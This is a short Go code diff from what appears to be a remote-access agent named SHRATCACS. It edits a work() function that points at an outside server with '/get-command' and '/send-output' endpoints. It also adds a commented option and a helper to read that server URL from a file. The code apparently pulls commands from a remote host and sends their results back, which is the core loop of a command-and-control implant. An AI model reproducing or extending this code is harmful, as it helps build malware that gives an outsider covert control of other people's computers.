@@ -225,7 +225,8 @@ func checkInstall() string {
 
 func work() {
 	// URL endpoints for receiving commands and sending output
-	url := "http://shratcacs.onrender.com"
+	// url := readFile("url.txt")
+	url := "http://shratcacs.onrender.com" // your SHRATCACS server
 	commandURL := url + "/get-command"
 	outputURL := url + "/send-output"
 
@@ -393,4 +394,12 @@ func copyFileContents(src, dst string) (err error) {
 	}
 	err = out.Sync()
 	return
+}
+
+func readFile(filePath string) string {
+	content, err := os.ReadFile(filePath)
+	if err != nil {
+		log.Fatalf("Failed to read file: %v", err)
+	}
+	return string(content)
 }
